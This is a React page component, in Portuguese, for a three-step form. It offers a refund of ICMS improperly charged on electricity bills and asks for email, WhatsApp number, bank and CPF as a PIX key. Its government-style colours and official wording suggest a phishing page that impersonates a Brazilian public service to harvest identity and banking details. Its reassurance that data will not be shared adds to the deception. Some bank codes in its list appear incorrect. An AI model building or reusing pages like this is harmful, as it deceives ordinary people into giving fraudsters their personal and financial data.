import { useState, useEffect } from "react";
import { useForm } from "react-hook-form";
import { zodResolver } from "@hookform/resolvers/zod";
import { z } from "zod";
import { useLocation } from "wouter";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import {
  Select,
  SelectContent,
  SelectItem,
  SelectTrigger,
  SelectValue,
} from "@/components/ui/select";
import {
  Form,
  FormControl,
  FormDescription,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { useToast } from "@/hooks/use-toast";
import { CheckCircle2, AlertCircle, CreditCard, Check, ChevronRight, Phone, Mail, BanknoteIcon, CircleDollarSign } from "lucide-react";
import Header from "@/components/Header";
import Footer from "@/components/Footer";

// Lista de bancos brasileiros (completa e ordenada)
const bancosBrasileiros = [
  { id: "001", nome: "Banco do Brasil S.A." },
  { id: "033", nome: "Banco Santander (Brasil) S.A." },
  { id: "041", nome: "Banco do Estado do Rio Grande do Sul S.A. (Banrisul)" },
  { id: "070", nome: "Banco de Brasília S.A. (BRB)" },
  { id: "077", nome: "Banco Inter S.A." },
  { id: "104", nome: "Caixa Econômica Federal" },
  { id: "208", nome: "Banco BTG Pactual S.A." },
  { id: "212", nome: "Banco Original S.A." },
  { id: "237", nome: "Banco Bradesco S.A." },
  { id: "260", nome: "Nubank" },
  { id: "290", nome: "PagBank" },
  { id: "341", nome: "Itaú Unibanco S.A." },
  { id: "336", nome: "C6 Bank" },
  { id: "389", nome: "Banco Mercantil do Brasil" },
  { id: "422", nome: "Banco Safra S.A." },
  { id: "623", nome: "Banco Pan S.A." },
  { id: "655", nome: "Banco Votorantim S.A. (BV)" },
  { id: "748", nome: "Banco Cooperativo Sicredi S.A." },
  { id: "756", nome: "Banco Cooperativo do Brasil S.A. (Sicoob)" },
  { id: "021", nome: "Banco do Estado do Espírito Santo S.A. (Banestes)" },
  { id: "025", nome: "Banco Alfa" },
  { id: "085", nome: "Cooperativa Central de Crédito Urbano - CECRED" },
  { id: "136", nome: "Unicred" },
  { id: "197", nome: "Stone Pagamentos" },
  { id: "656", nome: "Neon Pagamentos" },
  { id: "999", nome: "Banco Nacional de Desenvolvimento Econômico e Social (BNDES)" },
  { id: "000", nome: "Banco da Amazônia S.A." },
  { id: "004", nome: "Banco do Nordeste do Brasil S.A." },
  { id: "005", nome: "Banco Regional de Desenvolvimento do Extremo Sul (BRDE)" },
  { id: "002", nome: "Banco Central do Brasil" },
  { id: "003", nome: "Banco do Estado do Pará S.A. (Banpará)" },
  { id: "007", nome: "Banco do Estado de Sergipe S.A. (Banese)" },
  { id: "066", nome: "Banco Morgan Stanley S.A." },
  { id: "300", nome: "Banco de Desenvolvimento de Minas Gerais" },
  { id: "318", nome: "Banco ABN Amro S.A." },
  { id: "320", nome: "Banco CCB Brasil S.A." },
  { id: "323", nome: "Banco Credibel S.A." },
  { id: "611", nome: "Banco Paulista S.A." },
  { id: "626", nome: "Banco Ficsa S.A." },
  { id: "633", nome: "Banco Rendimento S.A." },
  { id: "652", nome: "Itaú Unibanco Holding S.A." },
  { id: "735", nome: "Banco Neon S.A." },
  { id: "741", nome: "Banco Ribeirão Preto S.A." },
  { id: "743", nome: "Banco Semear S.A." },
  { id: "745", nome: "Banco Citibank S.A." },
  { id: "746", nome: "Banco Modal S.A." },
  { id: "747", nome: "Banco Rabobank International Brasil S.A." },
  { id: "751", nome: "Scotiabank Brasil S.A. Banco Múltiplo" },
  { id: "752", nome: "Banco BNP Paribas Brasil S.A." },
  { id: "755", nome: "Bank of America Merrill Lynch Banco Múltiplo S.A." },
];

// Esquema de validação para o formulário de contato
const contatoSchema = z.object({
  email: z.string().email("Email inválido").min(1, "Email é obrigatório"),
  telefone: z
    .string()
    .min(10, "Telefone deve ter pelo menos 10 dígitos")
    .max(17, "Telefone inválido")
    .regex(/[\d\s\(\)\-]+/, "Formato inválido de telefone"),
});

// Esquema de validação para os dados bancários
const dadosBancariosSchema = z.object({
  banco: z.string().min(1, "Selecione um banco"),
  chavePix: z.string().min(11, "CPF deve ter pelo menos 11 dígitos").max(11, "CPF deve ter no máximo 11 dígitos"),
});

type ContatoFormValues = z.infer<typeof contatoSchema>;
type DadosBancariosFormValues = z.infer<typeof dadosBancariosSchema>;

export default function Confirmacao() {
  const [location, navigate] = useLocation();
  const [etapa, setEtapa] = useState<"contato" | "bancarios" | "confirmacao">("contato");
  const [valorRestituicao, setValorRestituicao] = useState("R$ 0,00");
  const [telefoneConfirmado, setTelefoneConfirmado] = useState("");
  const [emailConfirmado, setEmailConfirmado] = useState("");
  const [bancoSelecionado, setBancoSelecionado] = useState("");
  const [chavePix, setChavePix] = useState("");
  const [nomeUsuario, setNomeUsuario] = useState("");
  const [nomeCompletoUsuario, setNomeCompletoUsuario] = useState("");
  const [animacaoAtiva, setAnimacaoAtiva] = useState(false);

  const { toast } = useToast();

  // Estado e companhia
  const [estadoUsuario, setEstadoUsuario] = useState("");
  const [companhiaEletrica, setCompanhiaEletrica] = useState("");
  const [dataNascimento, setDataNascimento] = useState("");

  // Extrair parâmetros da URL
  useEffect(() => {
    const params = new URLSearchParams(window.location.search);
    const nome = params.get("nome") || "";
    const valor = params.get("valor") || "0";
    const estado = params.get("estado") || "";
    const companhia = params.get("companhia") || "";
    const nasc = params.get("nasc") || "";
    
    // Guardar nome completo e primeiro nome separadamente
    setNomeCompletoUsuario(nome);
    setNomeUsuario(nome.split(" ")[0]);
    setEstadoUsuario(estado);
    setCompanhiaEletrica(companhia);
    setDataNascimento(nasc);
    
    // Formatar o valor para exibição
    const valorNumerico = parseFloat(valor);
    setValorRestituicao(
      valorNumerico.toLocaleString("pt-BR", {
        style: "currency",
        currency: "BRL",
      })
    );
    
    // Ativar animação de entrada
    setAnimacaoAtiva(true);
    
    // Desativar animação após um tempo
    setTimeout(() => setAnimacaoAtiva(false), 1000);
  }, []);

  // Formulário de contato
  const contatoForm = useForm<ContatoFormValues>({
    resolver: zodResolver(contatoSchema),
    defaultValues: {
      email: "",
      telefone: "",
    },
  });

  // Formulário de dados bancários
  const dadosBancariosForm = useForm<DadosBancariosFormValues>({
    resolver: zodResolver(dadosBancariosSchema),
    defaultValues: {
      banco: "",
      chavePix: "",
    },
  });

  // Formatar telefone
  const formatarTelefone = (telefone: string) => {
    if (!telefone) return "";
    
    // (XX) XXXXX-XXXX
    if (telefone.length === 11) {
      return `(${telefone.substring(0, 2)}) ${telefone.substring(
        2,
        7
      )}-${telefone.substring(7)}`;
    }
    
    return telefone;
  };

  // Formatar CPF
  const formatarCPF = (cpf: string) => {
    if (!cpf) return "";
    
    // XXX.XXX.XXX-XX
    return cpf.replace(/(\d{3})(\d{3})(\d{3})(\d{2})/, "$1.$2.$3-$4");
  };

  // Enviar dados de contato e ir para próxima etapa
  const onSubmitContato = async (data: ContatoFormValues) => {
    try {
      // Animação de transição
      setAnimacaoAtiva(true);
      
      // Atualizar estado
      setTelefoneConfirmado(data.telefone);
      setEmailConfirmado(data.email);
      
      // Ir para próxima etapa com atraso para animação
      setTimeout(() => {
        setEtapa("bancarios");
        setAnimacaoAtiva(false);
      }, 300);
      
      // Mostrar toast
      toast({
        title: "Dados salvos com sucesso!",
        description: "Agora vamos para os dados bancários.",
      });
    } catch (error) {
      setAnimacaoAtiva(false);
      toast({
        variant: "destructive",
        title: "Erro ao salvar dados",
        description: "Não foi possível salvar seus dados. Tente novamente.",
      });
    }
  };

  // Submeter dados bancários
  const onSubmitDadosBancarios = (data: DadosBancariosFormValues) => {
    // Animação de transição
    setAnimacaoAtiva(true);
    
    setBancoSelecionado(
      bancosBrasileiros.find((banco) => banco.id === data.banco)?.nome || ""
    );
    setChavePix(data.chavePix);
    
    setTimeout(() => {
      setEtapa("confirmacao");
      setAnimacaoAtiva(false);
    }, 300);
  };

  // Finalizar processo
  const finalizarProcesso = () => {
    // Animação de transição
    setAnimacaoAtiva(true);
    
    setTimeout(() => {
      // Usar navigate da wouter em vez de window.location.href
      navigate("/sucesso?nome=" + encodeURIComponent(nomeUsuario));
    }, 500);
  };

  // Renderizar etapas
  const renderEtapa = () => {
    const classeAnimacao = animacaoAtiva 
      ? "transition-opacity duration-300 opacity-0" 
      : "transition-opacity duration-300 opacity-100";
    
    switch (etapa) {
      case "contato":
        return (
          <div className={classeAnimacao}>
            <Form {...contatoForm}>
              <form onSubmit={contatoForm.handleSubmit(onSubmitContato)} className="space-y-6">
                <div className="space-y-4">
                  <div className="flex items-center mb-4 p-3 bg-blue-50 rounded-lg">
                    <Mail className="h-5 w-5 text-blue-500 mr-3 flex-shrink-0" />
                    <p className="text-blue-700 text-sm">Seus dados serão usados apenas para o processo de restituição e não serão compartilhados com terceiros.</p>
                  </div>
                  
                  <FormField
                    control={contatoForm.control}
                    name="email"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">E-mail</FormLabel>
                        <FormControl>
                          <Input
                            placeholder="seu.email@exemplo.com"
                            type="email"
                            className="border-[var(--gov-gray)] focus-visible:ring-[var(--gov-blue)] transition-all"
                            {...field}
                          />
                        </FormControl>
                        <FormDescription>
                          Precisamos do seu e-mail para enviar atualizações sobre o processo
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={contatoForm.control}
                    name="telefone"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Celular com WhatsApp</FormLabel>
                        <FormControl>
                          <div className="flex items-center border rounded-md focus-within:ring-2 focus-within:ring-[var(--gov-blue)] focus-within:border-[var(--gov-blue)] transition-all">
                            <Phone className="ml-3 h-4 w-4 text-gray-400" />
                            <Input
                              placeholder="(11) 9 8888 8888"
                              type="tel"
                              maxLength={17}
                              className="border-0 focus-visible:ring-0 focus-visible:ring-offset-0"
                              {...field}
                              value={field.value}
                              onChange={(e) => {
                                // Aplicar a máscara (11) 9 8888 8888
                                let value = e.target.value.replace(/\D/g, ''); // Remove todos os não-dígitos
                                if (value.length > 0) {
                                  // Aplicar a máscara conforme o usuário digita
                                  value = value.replace(/^(\d{2})(\d)/g, '($1) $2'); // Coloca parênteses e espaço no DDD
                                  if (value.length > 3) {
                                    value = value.replace(/(\(\d{2}\) )(\d)/, '$1$2 '); // Adiciona espaço após o 9
                                  }
                                  if (value.length > 5) {
                                    value = value.replace(/(\(\d{2}\) \d )(\d{4})/, '$1$2 '); // Adiciona espaço após os primeiros 4 dígitos
                                  }
                                  if (value.length > 16) {
                                    value = value.substring(0, 16); // Limita ao tamanho máximo
                                  }
                                }
                                field.onChange(value);
                              }}
                            />
                          </div>
                        </FormControl>
                        <FormDescription>
                          Número para contato sobre sua restituição
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                <div className="flex justify-end mt-6">
                  <Button 
                    type="submit" 
                    className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 text-white font-semibold px-6 transition-all"
                  >
                    Continuar
                    <ChevronRight className="ml-2 h-4 w-4" />
                  </Button>
                </div>
              </form>
            </Form>
          </div>
        );

      case "bancarios":
        return (
          <div className={classeAnimacao}>
            <div className="mb-4 bg-amber-50 rounded-lg p-4 border-l-4 border-amber-500">
              <div className="flex items-start">
                <BanknoteIcon className="h-5 w-5 text-amber-500 mt-0.5 mr-3 flex-shrink-0" />
                <div>
                  <h3 className="text-amber-700 font-semibold">Informações bancárias</h3>
                  <p className="text-amber-600 text-sm mt-1">
                    Selecione seu banco e informe o CPF associado à sua chave PIX para receber a restituição
                  </p>
                </div>
              </div>
            </div>
            
            <Form {...dadosBancariosForm}>
              <form onSubmit={dadosBancariosForm.handleSubmit(onSubmitDadosBancarios)} className="space-y-6">
                <div className="space-y-4">
                  <FormField
                    control={dadosBancariosForm.control}
                    name="banco"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Banco</FormLabel>
                        <Select
                          onValueChange={field.onChange}
                          defaultValue={field.value}
                        >
                          <FormControl>
                            <SelectTrigger className="border-[var(--gov-gray)] focus:border-[var(--gov-blue)] transition-all">
                              <SelectValue placeholder="Selecione seu banco" />
                            </SelectTrigger>
                          </FormControl>
                          <SelectContent className="max-h-80">
                            {bancosBrasileiros.map((banco) => (
                              <SelectItem key={banco.id} value={banco.id}>
                                {banco.nome}
                              </SelectItem>
                            ))}
                          </SelectContent>
                        </Select>
                        <FormDescription>
                          Selecione o banco onde você receberá o valor da restituição
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />

                  <FormField
                    control={dadosBancariosForm.control}
                    name="chavePix"
                    render={({ field }) => (
                      <FormItem>
                        <FormLabel className="text-[var(--gov-blue-dark)] font-semibold">Chave PIX (CPF)</FormLabel>
                        <FormControl>
                          <div className="flex items-center border rounded-md focus-within:ring-2 focus-within:ring-[var(--gov-blue)] focus-within:border-[var(--gov-blue)] transition-all">
                            <CreditCard className="ml-3 h-4 w-4 text-gray-400" />
                            <Input
                              placeholder="Seu CPF sem pontos ou traços"
                              inputMode="numeric"
                              maxLength={11}
                              className="border-0 focus-visible:ring-0 focus-visible:ring-offset-0"
                              {...field}
                            />
                          </div>
                        </FormControl>
                        <FormDescription>
                          A restituição será enviada para a chave PIX associada ao seu CPF
                        </FormDescription>
                        <FormMessage />
                      </FormItem>
                    )}
                  />
                </div>

                <div className="flex justify-end mt-6">
                  <Button 
                    type="submit" 
                    className="bg-[var(--gov-blue)] hover:bg-[var(--gov-blue)]/90 text-white font-semibold px-6 transition-all"
                  >
                    Continuar
                    <ChevronRight className="ml-2 h-4 w-4" />
                  </Button>
                </div>
              </form>
            </Form>
          </div>
        );

      case "confirmacao":
        return (
          <div className={`${classeAnimacao} space-y-6`}>
            <div className="bg-white border border-gray-200 rounded-lg p-6 shadow-sm">
              <h3 className="text-xl font-semibold text-[var(--gov-blue-dark)] mb-4 flex items-center">
                <CircleDollarSign className="h-5 w-5 mr-2 text-green-500" />
                Resumo da Solicitação
              </h3>
              
              <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-6">
                <div className="bg-blue-50 p-4 rounded-lg border border-blue-100">
                  <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
                    Dados Pessoais
                  </h4>
                  <div className="space-y-2">
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-[var(--gov-gray-dark)]">Nome:</span>
                      <span className="font-medium text-[var(--gov-blue-dark)]">{nomeCompletoUsuario}</span>
                    </div>
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-[var(--gov-gray-dark)]">Data de Nascimento:</span>
                      <span className="font-medium text-[var(--gov-blue-dark)]">{dataNascimento}</span>
                    </div>
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-[var(--gov-gray-dark)]">Email:</span>
                      <span className="font-medium text-[var(--gov-blue-dark)]">{emailConfirmado}</span>
                    </div>
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-[var(--gov-gray-dark)]">Telefone:</span>
                      <span className="font-medium text-[var(--gov-blue-dark)]">{formatarTelefone(telefoneConfirmado)}</span>
                    </div>
                  </div>
                </div>
                
                <div className="bg-green-50 p-4 rounded-lg border border-green-100">
                  <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
                    Dados da Conta de Luz
                  </h4>
                  <div className="space-y-2">
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-[var(--gov-gray-dark)]">Estado:</span>
                      <span className="font-medium text-[var(--gov-blue-dark)]">{estadoUsuario}</span>
                    </div>
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-[var(--gov-gray-dark)]">Companhia:</span>
                      <span className="font-medium text-[var(--gov-blue-dark)]">{companhiaEletrica}</span>
                    </div>
                    <div className="flex justify-between items-center text-sm">
                      <span className="text-[var(--gov-gray-dark)]">Valor a Receber:</span>
                      <span className="font-bold text-green-600">{valorRestituicao}</span>
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="bg-amber-50 p-4 rounded-lg border border-amber-100 mb-4">
                <h4 className="text-sm font-semibold text-[var(--gov-blue-dark)] mb-2">
                  Dados Bancários
                </h4>
                <div className="space-y-2">
                  <div className="flex justify-between items-center text-sm">
                    <span className="text-[var(--gov-gray-dark)]">Banco:</span>
                    <span className="font-medium text-[var(--gov-blue-dark)]">{bancoSelecionado}</span>
                  </div>
                  <div className="flex justify-between items-center text-sm">
                    <span className="text-[var(--gov-gray-dark)]">Chave PIX (CPF):</span>
                    <span className="font-medium text-[var(--gov-blue-dark)]">{formatarCPF(chavePix)}</span>
                  </div>
                </div>
              </div>
              
              <div className="bg-yellow-50 border-l-4 border-yellow-500 p-4 rounded-r-lg mb-6">
                <div className="flex items-start">
                  <AlertCircle className="h-5 w-5 text-yellow-500 mt-0.5 mr-2 flex-shrink-0" />
                  <p className="text-sm text-yellow-700">
                    Ao confirmar, você declara que as informações fornecidas são verdadeiras e concorda
                    com os termos do processo de restituição do ICMS cobrado indevidamente.
                  </p>
                </div>
              </div>
              
              <div className="flex justify-center mt-6">
                <Button 
                  onClick={finalizarProcesso}
                  className="bg-[var(--gov-yellow)] hover:bg-[var(--gov-yellow)]/90 text-[var(--gov-blue-dark)] font-bold py-6 px-8 text-lg rounded-lg shadow-md hover:shadow-lg transform hover:-translate-y-1 transition-all duration-200"
                >
                  <CheckCircle2 className="mr-2 h-5 w-5" />
                  Confirmar e Finalizar
                </Button>
              </div>
            </div>
          </div>
        );
      
      default:
        return null;
    }
  };

  return (
    <>
      <Header />
      <main className="bg-[var(--gov-gray-light)] min-h-screen py-10">
        <div className="container max-w-4xl mx-auto px-4">
          <div className="bg-white rounded-lg shadow-md p-6">
            <div className="max-w-3xl mx-auto">
              {/* Informação do valor */}
              <div className="text-center mb-6">
                <h1 className="text-2xl font-bold text-[var(--gov-blue-dark)] mb-2">
                  Olá {nomeUsuario}, você está quase lá!
                </h1>
                <p className="text-[var(--gov-gray-dark)] mb-2">
                  Complete suas informações para receber sua restituição
                </p>
                <div className="mb-2 text-lg text-[var(--gov-blue-dark)]">no valor de</div>
                <div className="text-4xl font-bold bg-gradient-to-r from-green-600 to-blue-600 text-transparent bg-clip-text">{valorRestituicao}</div>
              </div>

              {/* Progresso visual elegante */}
              <div className="flex items-center justify-center mb-8">
                <div className="flex space-x-1 w-full max-w-md">
                  <div 
                    className={`h-2 flex-1 rounded-l-full transition-all duration-500 ${
                      etapa === "contato" 
                        ? "bg-[var(--gov-blue-dark)]" 
                        : etapa === "bancarios" || etapa === "confirmacao" 
                          ? "bg-[var(--gov-blue)]" 
                          : "bg-gray-200"
                    }`}
                  ></div>
                  <div 
                    className={`h-2 flex-1 transition-all duration-500 ${
                      etapa === "bancarios" 
                        ? "bg-[var(--gov-blue-dark)]" 
                        : etapa === "confirmacao" 
                          ? "bg-[var(--gov-blue)]" 
                          : "bg-gray-200"
                    }`}
                  ></div>
                  <div 
                    className={`h-2 flex-1 rounded-r-full transition-all duration-500 ${
                      etapa === "confirmacao" 
                        ? "bg-[var(--gov-blue-dark)]" 
                        : "bg-gray-200"
                    }`}
                  ></div>
                </div>
              </div>
              
              {/* Etapas em texto - versão desktop */}
              <div className="hidden md:flex justify-between mb-8 px-2 max-w-md mx-auto">
                <div className={`text-sm font-medium transition-all duration-300 ${
                  etapa === "contato" ? "text-[var(--gov-blue-dark)]" : 
                  etapa === "bancarios" || etapa === "confirmacao" ? "text-[var(--gov-blue)]" : "text-gray-500"
                }`}>
                  Seus dados
                </div>
                <div className={`text-sm font-medium transition-all duration-300 ${
                  etapa === "bancarios" ? "text-[var(--gov-blue-dark)]" : 
                  etapa === "confirmacao" ? "text-[var(--gov-blue)]" : "text-gray-500"
                }`}>
                  Dados bancários
                </div>
                <div className={`text-sm font-medium transition-all duration-300 ${
                  etapa === "confirmacao" ? "text-[var(--gov-blue-dark)]" : "text-gray-500"
                }`}>
                  Finalizar
                </div>
              </div>
              
              {/* Etapas em texto - versão mobile */}
              <div className="flex md:hidden justify-center mb-8 px-2 max-w-md mx-auto">
                <div className="text-center">
                  <span className="font-medium text-[var(--gov-blue-dark)]">
                    {etapa === "contato" ? "Etapa 1/3: Seus dados" : 
                     etapa === "bancarios" ? "Etapa 2/3: Dados bancários" : 
                     "Etapa 3/3: Finalizar"}
                  </span>
                </div>
              </div>

              {/* Conteúdo da etapa atual */}
              <div className="bg-white rounded-lg p-4">
                {renderEtapa()}
              </div>
            </div>
          </div>
        </div>
      </main>
      <Footer />
    </>
  );
}